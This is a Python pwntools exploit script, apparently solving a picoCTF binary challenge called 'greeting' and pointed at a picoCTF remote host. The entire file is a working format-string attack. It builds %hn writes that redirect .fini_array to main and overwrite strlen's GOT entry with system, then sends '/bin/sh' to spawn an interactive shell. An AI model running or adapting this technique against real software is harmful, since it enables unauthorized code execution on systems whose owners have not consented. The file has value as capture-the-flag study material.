#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./greeting", checksec=False)
#libc = ELF("/usr/lib/i386-linux-gnu/libc.so.6", checksec=False)

info = lambda msg, x: log.info(msg + hex(x))
warn = lambda msg: log.warn(msg)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

if args.REMOTE:
    p = remote("rhea.picoctf.net", 53917)
else:
    p = process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x0804864F 
	    c
	''')
    #input()

pad_n = len("Nice to meet you, ")
fini_array = 0x08049934
strlen = exe.got['strlen']
main = exe.sym['main']
system = exe.plt['system']
arr = [
        (main & 0xffff, fini_array),
        (main>>16 & 0xffff, fini_array + 2),
        (system & 0xffff, strlen),
        (system>>16 & 0xffff, strlen + 2),
]
arr = sorted(arr)
print(arr)

fmt = lambda x, y, n: f"%{x-y}c".encode() * (x!=y) + f"%{n}$hn".encode()

payload = b""
#payload += fmt(arr[0][0], pad_n, 33)
payload += fmt(arr[1][0], pad_n, 34)
payload += fmt(arr[2][0], arr[1][0], 35)
payload += fmt(arr[3][0], arr[2][0], 36)

payload = payload.ljust(40, b'A')
payload += p32(arr[0][1])
payload += p32(arr[1][1])
payload += p32(arr[2][1])
payload += p32(arr[3][1])

sla(b"Please tell me your name... ", payload)
sl(b"/bin/sh")
p.interactive()
